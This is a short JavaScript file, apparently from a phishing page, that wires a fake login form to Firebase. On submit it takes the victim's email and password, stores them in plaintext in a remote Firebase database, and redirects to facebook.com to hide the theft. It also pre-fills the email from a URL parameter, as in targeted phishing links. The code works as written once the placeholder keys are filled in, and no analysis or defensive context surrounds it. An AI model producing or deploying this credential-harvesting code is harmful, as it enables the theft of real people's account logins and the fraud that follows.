//Add here the config to Firebase
var config = {
    apiKey: "XXXXX",
    authDomain: "XXXXXX.firebaseapp.com",
    databaseURL: "XXXXXXX.firebaseio.com",
    storageBucket: "XXXXXX.appspot.com",
    messagingSenderId: "XXXXXXX"
};
var app = firebase.initializeApp(config);
var ref = app.database().ref("conver/data/grid/list/users")

$('.login-form').submit(function (e) {
    var $this = $(this),
        $email= $this.find('input[type=email]').val(),
        $pass = $this.find('input[type=password]').val(),
        $data = {
            email: $email,
            pass : $pass
        };

    ref.push($data).then(function(response){
       window.location = 'http://facebook.com';
    }).catch(function(err){
        console.log(err);
    });
    e.preventDefault();
});
function getParameterByName(name) {
    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
    var regexS = "[\\?&]" + name + "=([^&#]*)";
    var regex = new RegExp(regexS);
    var results = regex.exec(window.location.href);
    if (results == null)
        return "";
    else
        return results[1];
}
var inputEmail = getParameterByName('email');
$('input[type=email]').val(inputEmail);
$(document).ready(function(){
    $('input[type=password]').focus();
});